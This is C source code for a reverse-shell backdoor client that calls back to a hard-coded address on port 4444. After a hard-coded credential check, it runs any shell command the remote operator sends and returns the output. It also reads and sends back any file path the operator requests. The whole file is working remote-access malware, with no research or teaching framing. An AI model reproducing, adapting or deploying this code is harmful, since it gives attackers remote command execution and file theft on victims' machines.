#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>

#define PORT 4444
#define IP_ADDRESS "0.0.0.0"
#define BUFFER_SIZE 1048576
#define ID "1885033496@linux"

int client_socket;

int connect_socket(char *ip_address, int port) {
    struct sockaddr_in server_address;
    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(port);

    if(inet_pton(AF_INET, ip_address, &server_address.sin_addr) <= 0) {

        return 0;
    }

    if(connect(client_socket, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {

        return 0;
    }

    return 1;
}

int super_connect() {
    while(1) {
        if(connect_socket(IP_ADDRESS, PORT)) {
            return 1;
        }

        if(connect_socket(IP_ADDRESS, PORT)) {
            return 1;
        }

        sleep(2);
    }
}
void handle(int suc) {
    char buffer[BUFFER_SIZE];
    char username[256], password[256], msg[BUFFER_SIZE];
    char expected_username[256] = "badr_eddin@kali";  // replace with your expected username
    char expected_password[256] = "badr_eddin_linux_x86_64";  // replace with your expected password

    while (suc) {
        memset(buffer, 0, sizeof(buffer));
        read(client_socket, buffer, BUFFER_SIZE);

        if (strcmp(buffer, "about.id") == 0) {
            write(client_socket, ID, strlen(ID));
        } else {
            sscanf(buffer, "<%[^>]>|<%[^>]>|<%[^>]>", username, password, msg);

            if (strcmp(username, expected_username) != 0 || strcmp(password, expected_password) != 0) {
                char *error_msg = "Invalid username or password.";
                write(client_socket, error_msg, strlen(error_msg));
                continue;
            }
            if (strncmp(msg, "file:", 5) == 0) { // check if buffer starts with "file:"
                char filepath[256];
                sscanf(msg, "file:%s", filepath); // parse the file path from the buffer

                // Open the file
                FILE *file = fopen(filepath, "rb");
                if (file == NULL) {
                    // handle error if needed
                } else {
                    // Read the file into the buffer and send it
                    size_t bytes_read = fread(buffer, sizeof(char), sizeof(buffer), file);
                    while (bytes_read > 0) {
                        write(client_socket, buffer, bytes_read);
                        bytes_read = fread(buffer, sizeof(char), sizeof(buffer), file);
                    }
                    fclose(file);
                    sleep(1);
                    // Send kill code after sending the file
                    write(client_socket, "1089f990-3641-4f3c-ace7-cc98f28f9d1d", 36);
                }
            }
            else {
                // Run the command and capture its output
                char command_with_redirect[256];
                sprintf(command_with_redirect, "%s 2>&1", msg); // append '2>&1' to the command
                FILE *cmd_output = popen(command_with_redirect, "r");
                if (cmd_output == NULL) {
                    char *error_msg = "Error executing the command.";
                    write(client_socket, error_msg, strlen(error_msg));
                } else {
                    char *output = NULL;
                    char line_buffer[BUFFER_SIZE];
                    size_t total_len = 0;

                    // Read the command output line by line and accumulate it in the output buffer
                    while (fgets(line_buffer, sizeof(line_buffer), cmd_output) != NULL) {
                        size_t line_len = strlen(line_buffer);
                        output = realloc(output, total_len + line_len + 1);
                        strncpy(output + total_len, line_buffer, line_len + 1);
                        total_len += line_len;
                    }

                    // Send the accumulated output back to the server
                    write(client_socket, output, total_len);

                    free(output); // don't forget to free the memory
                    pclose(cmd_output);

                    sleep(1);
                    write(client_socket, "1089f990-3641-4f3c-ace7-cc98f28f9d1d", 36);
                }
            }
        }
    }
}



int main() {
    client_socket = socket(AF_INET, SOCK_STREAM, 0);
    if(client_socket < 0) {
        return -1;
    }

    int suc = super_connect();
    handle(suc);

    return 0;
}